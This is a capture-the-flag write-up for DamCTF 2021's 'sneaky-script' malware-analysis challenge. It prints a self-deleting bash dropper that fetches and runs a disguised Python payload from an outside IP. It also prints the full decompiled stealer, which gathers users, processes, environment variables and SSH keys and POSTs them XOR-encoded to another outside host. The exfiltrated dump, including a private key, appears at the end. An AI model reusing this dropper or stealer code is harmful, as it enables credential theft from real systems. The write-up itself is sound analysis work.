# DamCTF 2021

Platform: CTFtime

# Malware

## sneaky-script

```bash
cat mal.sh                                                                                                   1 ⨯
#!/bin/bash

rm -f "${BASH_SOURCE[0]}"

which python3 >/dev/null
if [[ $? -ne 0 ]]; then
    exit
fi

which curl >/dev/null
if [[ $? -ne 0 ]]; then
    exit
fi

mac_addr=$(ip addr | grep 'state UP' -A1 | tail -n1 | awk '{print $2}')

curl 54.80.43.46/images/banner.png?cache=$(base64 <<< $mac_addr) -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 2>/dev/null | base64 -d > /tmp/.cacheimg
python3 /tmp/.cacheimg
rm -f /tmp/.cacheimg
```

After analysis of this script, we can consider that an attacker downloaded a file and executed it with python.

We can check in Wireshark HTTP traffic and get this file. But this file is a bite-compiled file for python. I used `uncompyle6` to decompyle it.

I modified it a bit to execute, but it doesn't need here:

```python
# uncompyle6 version 3.8.0
# Python bytecode 3.6 (3379)
# Decompiled from: Python 3.9.7 (default, Sep 24 2021, 09:43:00) 
# [GCC 10.3.0]
# Embedded file name: /tmp/tmpaliidej5
# Compiled at: 2021-09-25 20:59:31
# Size of source mod 2**32: 2900 bytes
import array, base64, fcntl, http.client, json, re, socket, struct, os, uuid

def get_net_info():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    g = array.array('B', b'\x00' * 4096)
    y = struct.unpack('iL', fcntl.ioctl(s.fileno(), 35090, struct.pack('iL', 4096, g.buffer_info()[0])))[0]
    n = g.tobytes()
    a = []
    for i in range(0, y, 40):
        c = n[i:i + 16].split(b'\x00', 1)[0]
        c = c.decode()
        m = n[i + 20:i + 24]
        v = f"{m[0]}.{m[1]}.{m[2]}.{m[3]}"
        a.append((c, v))

    return a

def get_users():
    with open('/etc/passwd', 'r') as (f):
        x = [x.strip() for x in f.readlines()]
    g = []
    for z in x:
        a = z.split(':')
        if int(a[2]) < 1000 or int(a[2]) > 65000:
            if a[0] != 'root':
                continue
        g.append((a[2], a[0], a[5], a[6]))

    return g

def get_proc():
    n = []
    a = os.listdir('/proc')
    for b in a:
        try:
            int(b)
            x = os.readlink(f"/proc/{b}/exe")
            with open(f"/proc/{b}/cmdline", 'rb') as (f):
                s = (b' ').join(f.read().split(b'\x00')).decode()
            n.append((b, x, s))
        except:
            continue

    return n

def get_ssh(u):
    s = []
    try:
        x = os.listdir(u + '/.ssh')
        for y in x:
            try:
                with open(f"{u}/.ssh/{y}", 'r') as (f):
                    s.append((y, f.read()))
            except:
                continue

    except:
        pass

    return s

def build_output(net, user, proc, ssh):
    out = {}
    out['net'] = net
    out['proc'] = proc
    out['env'] = dict(os.environ)
    out['user'] = []
    for i in range(len(user)):
        out['user'].append({'info':user[i],  'ssh':ssh[i]})

    return out

def send(data):
    c = http.client.HTTPConnection('34.207.187.90')
    p = json.dumps(data).encode()
    print(p)
    k = b'8675309'
    d = bytes([p[i] ^ k[(i % len(k))] for i in range(len(p))])
    c.request('POST', '/upload', base64.b64encode(d))
    x = c.getresponse()

def a():
    key = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
    if '4b:e1:d6:a8:66:be' != key:
        return
    net = get_net_info()
    print(net)
    user = get_users()
    print(user)
    proc = get_proc()
    print(proc)
    ssh = []
    for _, _, a, _ in user:
        ssh.append(get_ssh(a))

    data = build_output(net, user, proc, ssh)
    send(data)

a()
# okay decompiling binary3.pyc
```

The script is simple to read. An attacker just takes whatever he wants and exfiltrates it via HTTP again. The main part here is send function:

```python
def send(data):
    c = http.client.HTTPConnection('34.207.187.90')
    p = json.dumps(data).encode()
    print(p)
    k = b'8675309'
    d = bytes([p[i] ^ k[(i % len(k))] for i in range(len(p))])
    c.request('POST', '/upload', base64.b64encode(d))
    x = c.getresponse()
```

We can see, that an attacker encrypts with xor and key the payload. So, we again return to wireshark, take this sent data in `POST /upload`. Then, I wrote a simple script to read this data from file and decrypt it:

```python
#!/usr/bin/env python3
import base64

encoded_data = open('data_from_upload', 'r').read()
print(encoded_data)
encrypted_data = base64.b64decode(encoded_data)
print(encrypted_data)
key = b'8675309'
data = [encrypted_data[i] ^ key[(i % len(key))] for i in range(len(encrypted_data))]
print(''.join(map(chr, data)))
```

The result of this script is the following:

```erlang
{"net": [["lo", "127.0.0.1"], ["ens33", "192.168.88.134"]], "proc": [["4725", "/usr/lib/systemd/systemd", "/lib/systemd/systemd --user "], ["4732", "/usr/bin/pulseaudio", "/usr/bin/pulseaudio --daemonize=no --log-target=journal "], ["4734", "/usr/libexec/tracker-miner-fs", "/usr/libexec/tracker-miner-fs "], ["4737", "/usr/bin/dbus-daemon", "/usr/bin/dbus-daemon --session --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only "], ["4741", "/usr/libexec/gvfsd", "/usr/libexec/gvfsd "], ["4746", "/usr/libexec/gvfsd-fuse", "/usr/libexec/gvfsd-fuse /run/user/1000/gvfs -f -o big_writes "], ["4769", "/usr/libexec/gvfs-udisks2-volume-monitor", "/usr/libexec/gvfs-udisks2-volume-monitor "], ["4778", "/usr/libexec/gvfs-gphoto2-volume-monitor", "/usr/libexec/gvfs-gphoto2-volume-monitor "], ["4782", "/usr/libexec/gvfs-mtp-volume-monitor", "/usr/libexec/gvfs-mtp-volume-monitor "], ["4787", "/usr/libexec/gvfs-afc-volume-monitor", "/usr/libexec/gvfs-afc-volume-monitor "], ["4793", "/usr/libexec/gvfs-goa-volume-monitor", "/usr/libexec/gvfs-goa-volume-monitor "], ["4797", "/usr/libexec/goa-daemon", "/usr/libexec/goa-daemon "], ["4807", "/usr/libexec/goa-identity-service", "/usr/libexec/goa-identity-service "], ["4822", "/usr/lib/gdm3/gdm-x-session", "/usr/lib/gdm3/gdm-x-session --run-script env GNOME_SHELL_SESSION_MODE=ubuntu /usr/bin/gnome-session --systemd --session=ubuntu "], ["4825", "/usr/lib/xorg/Xorg", "/usr/lib/xorg/Xorg vt2 -displayfd 3 -auth /run/user/1000/gdm/Xauthority -background none -noreset -keeptty -verbose 3 "], ["4879", "/usr/libexec/gnome-session-binary", "/usr/libexec/gnome-session-binary --systemd --systemd --session=ubuntu "], ["5019", "/usr/libexec/at-spi-bus-launcher", "/usr/libexec/at-spi-bus-launcher "], ["5024", "/usr/bin/dbus-daemon", "/usr/bin/dbus-daemon --config-file=/usr/share/defaults/at-spi2/accessibility.conf --nofork --print-address 3 "], ["5043", "/usr/libexec/gnome-session-ctl", "/usr/libexec/gnome-session-ctl --monitor "], ["5064", "/usr/libexec/dconf-service", "/usr/libexec/dconf-service "], ["5068", "/usr/libexec/gnome-session-binary", "/usr/libexec/gnome-session-binary --systemd-service --session=ubuntu "], ["5085", "/usr/bin/gnome-shell", "/usr/bin/gnome-shell "], ["5129", "/usr/bin/ibus-daemon", "ibus-daemon --panel disable --xim "], ["5137", "/usr/libexec/ibus-memconf", "/usr/libexec/ibus-memconf "], ["5138", "/usr/libexec/ibus-extension-gtk3", "/usr/libexec/ibus-extension-gtk3 "], ["5142", "/usr/libexec/ibus-x11", "/usr/libexec/ibus-x11 --kill-daemon "], ["5144", "/usr/libexec/ibus-portal", "/usr/libexec/ibus-portal "], ["5154", "/usr/libexec/gnome-shell-calendar-server", "/usr/libexec/gnome-shell-calendar-server "], ["5157", "/usr/libexec/xdg-permission-store", "/usr/libexec/xdg-permission-store "], ["5162", "/usr/libexec/at-spi2-registryd", "/usr/libexec/at-spi2-registryd --use-gnome-session "], ["5177", "/usr/libexec/evolution-source-registry", "/usr/libexec/evolution-source-registry "], ["5189", "/usr/bin/gjs-console", "/usr/bin/gjs /usr/share/gnome-shell/org.gnome.Shell.Notifications "], ["5197", "/usr/libexec/evolution-calendar-factory", "/usr/libexec/evolution-calendar-factory "], ["5207", "/usr/libexec/gvfsd-trash", "/usr/libexec/gvfsd-trash --spawner :1.3 /org/gtk/gvfs/exec_spaw/0 "], ["5216", "/usr/libexec/gsd-a11y-settings", "/usr/libexec/gsd-a11y-settings "], ["5217", "/usr/libexec/gsd-color", "/usr/libexec/gsd-color "], ["5218", "/usr/libexec/gsd-datetime", "/usr/libexec/gsd-datetime "], ["5219", "/usr/libexec/gsd-housekeeping", "/usr/libexec/gsd-housekeeping "], ["5220", "/usr/libexec/gsd-keyboard", "/usr/libexec/gsd-keyboard "], ["5223", "/usr/libexec/gsd-media-keys", "/usr/libexec/gsd-media-keys "], ["5224", "/usr/libexec/gsd-power", "/usr/libexec/gsd-power "], ["5225", "/usr/libexec/gsd-print-notifications", "/usr/libexec/gsd-print-notifications "], ["5226", "/usr/libexec/gsd-rfkill", "/usr/libexec/gsd-rfkill "], ["5227", "/usr/libexec/gsd-screensaver-proxy", "/usr/libexec/gsd-screensaver-proxy "], ["5228", "/usr/libexec/gsd-sharing", "/usr/libexec/gsd-sharing "], ["5232", "/usr/libexec/gsd-smartcard", "/usr/libexec/gsd-smartcard "], ["5233", "/usr/libexec/gsd-sound", "/usr/libexec/gsd-sound "], ["5235", "/usr/libexec/gsd-usb-protection", "/usr/libexec/gsd-usb-protection "], ["5241", "/usr/libexec/gsd-wacom", "/usr/libexec/gsd-wacom "], ["5248", "/usr/libexec/gsd-wwan", "/usr/libexec/gsd-wwan "], ["5249", "/usr/libexec/gsd-xsettings", "/usr/libexec/gsd-xsettings "], ["5278", "/usr/libexec/ibus-engine-simple", "/usr/libexec/ibus-engine-simple "], ["5313", "/usr/libexec/gsd-printer", "/usr/libexec/gsd-printer "], ["5316", "/usr/bin/vmtoolsd", "/usr/bin/vmtoolsd -n vmusr --blockFd 3 "], ["5320", "/usr/libexec/gsd-disk-utility-notify", "/usr/libexec/gsd-disk-utility-notify "], ["5331", "/usr/libexec/evolution-addressbook-factory", "/usr/libexec/evolution-addressbook-factory "], ["5350", "/usr/libexec/gvfsd-metadata", "/usr/libexec/gvfsd-metadata "], ["5351", "/usr/libexec/evolution-data-server/evolution-alarm-notify", "/usr/libexec/evolution-data-server/evolution-alarm-notify "], ["6451", "/usr/bin/update-notifier", "update-notifier "], ["9294", "/usr/libexec/gnome-terminal-server", "/usr/libexec/gnome-terminal-server "], ["9303", "/usr/bin/bash", "bash "], ["13030", "/usr/lib/firefox/firefox", "/usr/lib/firefox/firefox -new-window "], ["13149", "/usr/lib/firefox/firefox", "/usr/lib/firefox/firefox -contentproc -childID 1 -isForBrowser -prefsLen 1 -prefMapSize 223603 -parentBuildID 20210204182252 -appdir /usr/lib/firefox/browser 13030 true tab "], ["13174", "/usr/lib/firefox/firefox", "/usr/lib/firefox/firefox -contentproc -childID 2 -isForBrowser -prefsLen 45 -prefMapSize 223603 -parentBuildID 20210204182252 -appdir /usr/lib/firefox/browser 13030 true tab "], ["13227", "/usr/lib/firefox/firefox", "/usr/lib/firefox/firefox -contentproc -childID 3 -isForBrowser -prefsLen 1246 -prefMapSize 223603 -parentBuildID 20210204182252 -appdir /usr/lib/firefox/browser 13030 true tab "], ["13327", "/usr/lib/firefox/firefox", "/usr/lib/firefox/firefox -contentproc -childID 4 -isForBrowser -prefsLen 10204 -prefMapSize 223603 -parentBuildID 20210204182252 -appdir /usr/lib/firefox/browser 13030 true tab "], ["22090", "/usr/lib/firefox/firefox", "/usr/lib/firefox/firefox -contentproc -childID 7 -isForBrowser -prefsLen 14317 -prefMapSize 223603 -parentBuildID 20210204182252 -appdir /usr/lib/firefox/browser 13030 true tab "], ["22859", "/usr/bin/gnome-control-center", "gnome-control-center "], ["22937", "/usr/libexec/gvfsd-network", "/usr/libexec/gvfsd-network --spawner :1.3 /org/gtk/gvfs/exec_spaw/1 "], ["22987", "/usr/libexec/gvfsd-dnssd", "/usr/libexec/gvfsd-dnssd --spawner :1.3 /org/gtk/gvfs/exec_spaw/3 "], ["30842", "/usr/libexec/tracker-store", "/usr/libexec/tracker-store "], ["30868", "/usr/bin/bash", "/bin/bash ./a.sh "], ["30875", "/usr/bin/python3.6", "python3 /tmp/.cacheimg "]], "env": {"SHELL": "/bin/bash", "SESSION_MANAGER": "local/ubuntu:@/tmp/.ICE-unix/5068,unix/ubuntu:/tmp/.ICE-unix/5068", "QT_ACCESSIBILITY": "1", "COLORTERM": "truecolor", "XDG_CONFIG_DIRS": "/etc/xdg/xdg-ubuntu:/etc/xdg", "XDG_MENU_PREFIX": "gnome-", "GNOME_DESKTOP_SESSION_ID": "this-is-deprecated", "GNOME_SHELL_SESSION_MODE": "ubuntu", "SSH_AUTH_SOCK": "/run/user/1000/keyring/ssh", "XMODIFIERS": "@im=ibus", "DESKTOP_SESSION": "ubuntu", "SSH_AGENT_PID": "4988", "GTK_MODULES": "gail:atk-bridge", "PWD": "/home/jim", "XDG_SESSION_DESKTOP": "ubuntu", "LOGNAME": "jim", "XDG_SESSION_TYPE": "x11", "GPG_AGENT_INFO": "/run/user/1000/gnupg/S.gpg-agent:0:1", "XAUTHORITY": "/run/user/1000/gdm/Xauthority", "GJS_DEBUG_TOPICS": "JS ERROR;JS LOG", "WINDOWPATH": "2", "HOME": "/home/jim", "USERNAME": "jim", "IM_CONFIG_PHASE": "1", "LANG": "en_US.UTF-8", "LS_COLORS": "rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:", "XDG_CURRENT_DESKTOP": "ubuntu:GNOME", "VTE_VERSION": "6003", "GNOME_TERMINAL_SCREEN": "/org/gnome/Terminal/screen/20a1c576_0ae5_4a9f_9bed_162e06ba9032", "INVOCATION_ID": "b5c7562742e44663aa23b8d7ef58d4b7", "MANAGERPID": "4725", "FLAG": "dam{oh_n0_a1l_muh_k3y5_are_g0n3}", "GJS_DEBUG_OUTPUT": "stderr", "LESSCLOSE": "/usr/bin/lesspipe %s %s", "XDG_SESSION_CLASS": "user", "TERM": "xterm-256color", "LESSOPEN": "| /usr/bin/lesspipe %s", "USER": "jim", "GNOME_TERMINAL_SERVICE": ":1.139", "DISPLAY": ":0", "SHLVL": "2", "QT_IM_MODULE": "ibus", "XDG_RUNTIME_DIR": "/run/user/1000", "JOURNAL_STREAM": "8:110255", "XDG_DATA_DIRS": "/usr/share/ubuntu:/usr/local/share/:/usr/share/:/var/lib/snapd/desktop", "PATH": "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin", "GDMSESSION": "ubuntu", "DBUS_SESSION_BUS_ADDRESS": "unix:path=/run/user/1000/bus", "OLDPWD": "/home/jim/Desktop", "_": "/usr/bin/python3"}, "user": [{"info": ["0", "root", "/root", "/bin/bash"], "ssh": []}, {"info": ["1000", "jim", "/home/jim", "/bin/bash"], "ssh": [["id_rsa", "-----BEGIN OPENSSH PRIVATE KEY-----\n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\ngLprLHWBkOG/zsNg3kLAOh7NRnw=\n-----END OPENSSH PRIVATE KEY-----\n"], ["id_rsa.pub", "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC6zLk2gZB/Nsr2cLNVxS/AsMouSrXmT/drB/do6CNYl/LOun/d3JY9Riydyh+R0DlApOFnkCpTVJ9z6XosWhtACcNQJ3sKKp+bfQTL16BN+IDYuuZCu/XgX26a0WLCEDzVyz5Xao4T8mem6zNse1fKxTf24CoBacCwSvvw+hG/aB7pbKFsqy321kxmSKQcWC+r1HBu2JZfW/YQeSrC7qW9H0dfED8Ul2n9kEdqfnpvs+DH9Me0f+8K6Wdmsxwby/Zkdj10viB4SzBrLWSSXtasXlwYD2zquuylai5NGtgmIsNPLlRDteGYAMpkHahupm5s75wa117XK2oRzjhjwS31gSec0PiJUxr/WuDcoSXcWNSHo0qez1kvzwKgX3OhdMSRimFIo1dSzqHE7jtwi+G5AjL5Zs+N+xUnAbvqON/xfk2NfrveuymiO252qFP+Mrz/oQLJvCXq1JQrHyqHlx/KY52AiZp9Z5gNgnABmkobMZuM82djs74aK35Iks7GZLc= jim@ubuntu\n"]]}]}
```

Here, we can find SSH private key and above a little bit the flag `"FLAG": "dam{oh_n0_a1l_muh_k3y5_are_g0n3}"`.